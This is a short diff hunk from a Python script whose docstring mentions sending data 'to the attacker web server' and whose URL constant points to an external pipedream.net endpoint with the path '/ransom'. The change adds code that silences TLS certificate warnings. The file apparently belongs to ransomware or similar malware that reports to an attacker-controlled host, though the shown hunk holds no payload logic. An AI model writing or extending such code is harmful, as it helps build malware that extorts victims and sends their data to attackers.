@@ -4,6 +4,10 @@ to the attacker web server
 '''
 
 import requests
+from urllib3.exceptions import InsecureRequestWarning
+
+# Disable warnings
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 URL = "https://eofvljfbgmr0v83.m.pipedream.net/ransom"
 
